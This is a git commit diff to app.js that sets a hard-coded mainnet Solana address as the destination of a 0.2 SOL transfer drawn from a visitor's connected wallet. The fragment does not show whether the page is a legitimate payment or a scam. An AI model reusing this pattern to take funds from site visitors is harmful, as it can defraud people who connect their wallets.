7758a80aa63d6887144779b0bb6d033254cb0df5
dinesha100 <165416367+dinesha100@users.noreply.github.com>
2024-03-31 14:44:03 +0530

    Update app.js

--- app.js
+++ app.js
@@ -24,7 +24,7 @@ document.addEventListener("DOMContentLoaded", function() {
       try {
         const publicKey = await window.solana.publicKey();
         const from = publicKey.toBase58();
-        const to = 'destination_address'; // Replace with destination address
+        const to = '7nGL2nqCg3NxQCZxLB6gKmEFUJwvpLBntmSJKMmfwXQP'; // Replace with destination address
         const amount = 200000000; // 0.2 Sol in lamports
         const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
         const transaction = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
